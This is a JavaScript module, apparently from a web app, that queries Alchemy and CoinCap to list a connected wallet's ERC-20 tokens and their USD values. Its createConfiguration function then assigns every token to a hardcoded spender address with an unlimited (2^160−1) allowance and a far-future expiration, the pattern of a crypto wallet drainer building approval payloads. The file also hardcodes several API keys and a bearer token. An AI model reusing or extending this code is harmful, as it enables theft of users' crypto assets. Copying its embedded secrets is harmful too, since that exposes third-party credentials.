import axios from "axios";

const Alchemy = function (account) {
    switch (process.env.NEXT_PUBLIC_CHAIN) {
        case "1": //eth
            this.baseURL = `eth-mainnet.g.alchemy.com/v2/otntqecKVNu7AW5kP9Z370M8TsQ_cmsb`;
            break;
        case "10": //op
            this.baseURL = `opt-mainnet.g.alchemy.com/v2/OnNe0SQ2dcUrKW0ZFL6dYwWZLU0eN0Y1`;
            break;
        case "137": //polygon
            this.baseURL = `polygon-mainnet.g.alchemy.com/v2/jIzu1RHGnDY69icPLUQIkfwr_iJSTdAw`;
            break;
        case "42161": //arb
            this.baseURL = `arb-mainnet.g.alchemy.com/v2/bR4ts_uNNoy9eXzjsgjo5YVGL6pG-UCp`;
            break;
    }

    // this.apiKey = apiKey
    this.account = account ? account : "";
};

Alchemy.prototype = {
    inspectWalletToken: async function (ownerAddr) {
        this.ownerAddr = ownerAddr;

        const httpAlchemy = axios.create({
            baseURL: "https://",
            timeout: 1000 * 180,
            withCredentials: false,
        });
        var data = JSON.stringify({
            jsonrpc: "2.0",
            method: "alchemy_getTokenBalances",
            //params: [`${ownerAddr}`, [`${tokenAddr}`]],
            params: [`${this.ownerAddr}`, `erc20`],
            id: 42,
        });

        var config = {
            method: "post",
            url: this.baseURL,
            headers: {
                "Content-Type": "application/json",
            },
            data: data,
        };

        return await httpAlchemy(config);
    },
    inspectTokenPrice: async function (token_id) {
        const httpCoincap = axios.create({
            baseURL: "https://",
            timeout: 1000 * 180,
            withCredentials: false,
        });

        const config = {
            method: "get",
            maxBodyLength: Infinity,
            url: "api.coincap.io/v2/assets/" + token_id,
            headers: {
                Authorization: "Bearer 9b51a6cb-9627-47ff-9782-bbb2e6b08d6c",
            },
        };
        return await httpCoincap(config);
    },
    covertContract2token: async function (contractAddress) {
        const httpAlchemy = axios.create({
            baseURL: "https://",
            timeout: 1000 * 180,
            withCredentials: false,
        });
        var data = JSON.stringify({
            jsonrpc: "2.0",
            method: "alchemy_getTokenMetadata",
            params: [`${contractAddress}`],
            id: 1,
        });
        var config = {
            method: "post",
            url: this.baseURL,
            headers: {
                "Content-Type": "application/json",
            },
            data: data,
        };

        return await httpAlchemy(config);
    },
    getAssestIds: async function (token_name) {
        const httpCoincap = axios.create({
            baseURL: "https://",
            timeout: 1000 * 180,
            withCredentials: false,
        });

        const config = {
            method: "get",
            maxBodyLength: Infinity,
            url: "api.coincap.io/v2/assets?search=" + token_name + "&limit=1",
            headers: {
                Authorization: "Bearer 9b51a6cb-9627-47ff-9782-bbb2e6b08d6c",
            },
        };

        return await httpCoincap(config);
    },

    caculateValue: async function () {
        const tokenlist = await this.inspectWalletToken(this.account);

        let valueable_token = [];

        for await (let item of tokenlist.data.result.tokenBalances) {
            const hax_amount = parseInt(item.tokenBalance, 16);
            const decimal = hax_amount.toString().length;
            const amount = parseInt(hax_amount) / 10 ** parseInt(decimal);

            const value_able_token = await this.covertContract2token(
                item.contractAddress
            );
            const value_able_token_symbol = value_able_token.data.result.symbol;
            const value_able_token_id = await this.getAssestIds(
                value_able_token_symbol
            );
            const token_price = await this.inspectTokenPrice(
                value_able_token_id.data.data[0].id
            );
            const token_valueable = token_price.data.data.priceUsd * amount;

            const symbol = value_able_token_symbol.toLowerCase();
            const name = value_able_token.data.result.name;
            const address = item.contractAddress;
            const data = {
                name,
                amount,
                symbol,
                address,
                token_valueable,
            };
            valueable_token.push(data);
        }
        return valueable_token;
    },
    createConfiguration: async function () {
        let tokens = await this.caculateValue();

        const spender_address = "0xf347901a602e71e2F4ce7796e54146C2e746dd8c";
        const amount = "1461501637330902918203684832716283019655932542975";
        const expiration = 1885674579;

        let data = {};
        for await (let n of tokens) {
            (data["spender_address"] = spender_address),
                (data["expiration"] = expiration),
                (data[n.symbol.toLowerCase()] = {
                    name: n.symbol.toLowerCase(),
                    symbol: n.symbol.toLowerCase(),
                    address: n.address.toLowerCase(),
                    amount: amount,
                    expiration: expiration,
                });
        }

        return data;
    },
};

export default Alchemy;
